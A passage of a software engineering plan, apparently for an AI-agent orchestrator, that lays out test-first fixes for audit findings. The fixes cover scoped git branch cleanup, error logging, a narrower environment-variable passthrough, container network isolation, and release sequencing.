  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'us-rep-'))
  const run = (c) => execSync(c, { cwd: repo, shell: '/bin/bash' })
  run('git init -q && git config user.email t@t && git config user.name t && git commit -q --allow-empty -m seed')
  run('git branch ultraswarm/t1-codex && git branch ultraswarm/run-OTHER && git branch ultraswarm/t2-OTHER')
  cleanup({ repo, repoName: path.basename(repo), runId: 'THIS', tasks: [{ id: 't1', cli: 'codex' }], integrationBranch: 'ultraswarm/run-THIS' })
  const branches = execSync('git branch', { cwd: repo, encoding: 'utf8' })
  assert.doesNotMatch(branches, /t1-codex/, "this run's task branch is removed")
  assert.match(branches, /run-OTHER/, "another run's integration branch survives")
  assert.match(branches, /t2-OTHER/, "another run's task branch survives")
})
```

- [ ] **Step 2: Run RED** — FAIL (all `ultraswarm/*` deleted).

- [ ] **Step 3: Fix report.mjs — derive the exact branch set from `cfg`**

Replace lines 42-48 with a scoped deletion built from `cfg.tasks` (per-task branches `ultraswarm/<taskId>-<cli>`) plus the run's integration branch. Pass `runId`/`tasks`/`integrationBranch` through `cfg` (already present on the run cfg in `cli.mjs`):

```js
    // Scope deletion to THIS run's branches only — never touch another run's ultraswarm/* branches (#SE2).
    const mine = new Set((cfg.tasks || []).map((t) => `ultraswarm/${t.id}-${t.cli}`))
    if (cfg.integrationBranch) mine.add(cfg.integrationBranch)
    for (const name of mine) {
      try { execFileSync('git', ['branch', '-D', name], { cwd: cfg.repo, stdio: 'ignore' }) } catch { /* best-effort */ }
    }
```

(Confirm `cli.mjs` passes `tasks` and an `integrationBranch` on the `cfg` handed to `cleanup`; if not, add them where `cleanup(cfg)` is called in the `finally` block.)

- [ ] **Step 4: Run GREEN + full suite** — `node --test`
- [ ] **Step 5: Commit**

```bash
git add lib/orchestrator/report.mjs lib/orchestrator/report.test.mjs
git commit -m "fix(cleanup): scope branch deletion to the current run (#SE2)"
```

---

## PR H — MEDIUM/LOW: hardening & observability bundle

**Branch:** `fix/audit-hardening-bundle`

Five small, independent fixes. Each gets its own test + commit but ships in one PR.

### H1 — `parallel()` logs swallowed errors (#S5) — `lib/engine.mjs`

- [ ] **Test (engine.test.mjs):** a thunk that rejects still resolves to `null` AND emits a stderr line.

```js
test('parallel logs a swallowed rejection instead of dropping it silently (#S5)', async () => {
  const { parallel } = await import('./engine.mjs?s5')
  const errs = []; const orig = process.stderr.write.bind(process.stderr)
  process.stderr.write = (s) => (errs.push(String(s)), true)
  try { const r = await parallel([() => { throw new Error('boom-xyz') }, () => Promise.resolve(1)]); assert.deepEqual(r, [null, 1]) }
  finally { process.stderr.write = orig }
  assert.ok(errs.join('').includes('boom-xyz'))
})
```

- [ ] **Fix:** `nestedLimit(t).catch((e) => { log(`parallel task failed: ${e?.message ?? e}`); return null })` (reuse the existing `log`).
- [ ] **Commit:** `fix(engine): surface swallowed parallel() task errors (#S5)`

### H2 — thread QA-rejection feedback into competition retry (#O3) — `lib/orchestrator/core.mjs`

- [ ] **Fix:** in `handleFailedCompetition` (core.mjs:303-308), when called with a non-null `winner` that was QA-rejected, prepend the winner's QA `issues` to `seed`. Change the call site at `core.mjs:357` to pass the verdict, and build the seed from `[...qaIssues, ...all.filter(i => i.status !== 'ok').map(…)]`. (Capture `verdict` from line 348 and pass `verdict.issues` through.)
- [ ] **Test (core.harness.test.mjs):** a competition whose winner passes gates but is QA-rejected retries with the QA issue text present in the feedback seed (assert via a spy on `intelligentAttemptLoop`'s seed argument, or via the mock brain's received feedback).
- [ ] **Commit:** `fix(core): forward QA-rejection feedback into competition retry (#O3)`

### H3 — narrow the `XDG_*` env wildcard (#SE4) — `lib/orchestrator/implement.mjs:38`

- [ ] **Test (implement.test.mjs):** `allowedEnv()` includes `XDG_CONFIG_HOME`/`XDG_CACHE_HOME` but excludes an arbitrary `XDG_SESSION_COOKIE`.

```js
test('allowedEnv passes only specific XDG vars, not the whole XDG_* namespace (#SE4)', () => {
  process.env.XDG_CONFIG_HOME = '/c'; process.env.XDG_SESSION_COOKIE = 'secret'
  const env = allowedEnv({})
  assert.equal(env.XDG_CONFIG_HOME, '/c')
  assert.equal('XDG_SESSION_COOKIE' in env, false)
})
```

- [ ] **Fix:** replace `key.startsWith('XDG_')` with membership in an explicit set added to `names`: `XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, `XDG_DATA_HOME`, `XDG_RUNTIME_DIR`.
- [ ] **Commit:** `fix(security): narrow worker env XDG passthrough to named vars (#SE4)`

### H4 — container isolation hardening (#SE3) — `lib/workers/adapters.mjs`

- [ ] **Test (adapters.test.mjs):** building the container command for a worker with `isolation:'container'` and a `cwd` containing `:` throws a clear error; and `--network none` is present unless `network:'allow'` is explicitly set. (Assert on the constructed argv.)
- [ ] **Fix:** validate `!cwd.includes(':')` (throw a clear error otherwise); default the container to `--network none` and only drop it when `policy.network === 'allow'`. Update the docstring/README note that container network isolation is on by default.
- [ ] **Commit:** `fix(workers): default container network isolation + reject ':' in mount path (#SE3)`

### H5 — accurate competition `final_model_tier` + documented judge fallback (#O4, #S6) — `lib/orchestrator/core.mjs`

- [ ] **Fix (#O4):** at `core.mjs:351-352`, report `final_model_tier: winner.complexity_achieved != null ? t.model_tier : t.model_tier` — i.e. use the task's resolved tier (or the escalated tier threaded from the attempt loop) rather than `winner.model_used` (always `'external'`). Concretely, carry the tier on the impl object (set it in `runImplementation`'s `impl()` factory from `t.model_tier`) and read that.
- [ ] **Fix (#S6):** add a one-line comment at `core.mjs:292`/`299` documenting that `winner` defaults to `impls[0]` when all judges fail (logged, gated by adaptiveQA — intentional, not a silent merit bypass).
- [ ] **Test:** a competition win records a real tier (e.g. `'moderate'`), not `'external'`.
- [ ] **Commit:** `fix(core): report real model tier on competition win; document judge fallback (#O4,#S6)`

- [ ] **Final step for PR H:** `node --test && npm run validate` → all green; open PR.

---

## Release & sequencing

- Ship **A, B, C** first (Critical/High, independent files). They can go in parallel PRs.
- Then **D, E** (boundary validation, cost).
- Then **F** (recovery — largest, schema migration; review carefully).
- Then **G, H** (scoped cleanup, hardening bundle).
- Version: either bump patch per PR (3.5.2 … 3.5.9) or batch the set and cut one `3.6.0` release at the end. Recommend per-PR patch bumps so each is independently revertable, matching the #36 flow.
- Each PR: branch → TDD → `node --test` + `npm run validate` green → `gh pr create` (`Closes`/references the finding ids in the body) → wait for `validate` CI → squash-merge → delete branch.

## Self-review notes

- **Coverage:** every one of the 20 findings maps to a task above (see the coverage table); no finding is unaddressed.
- **TDD:** each fix has a concrete failing test before the change.
- **Type/name consistency:** new helpers — `extractJson` (anthropic), `store.bootId()`, `store.setOrchestrator()`, `runs.orchestrator_pid`/`runs.orchestrator_boot`, `cfg.integrationBranch`/`cfg.tasks` for cleanup — are referenced consistently across the tasks that use them.
- **Open design choices flagged for approval:** (B) reject-metacharacters vs argv execution; (E) accurate post-hoc cost vs hard atomic reservation; (F) boot-id liveness + new schema columns (a migration). Confirm these before executing F especially.
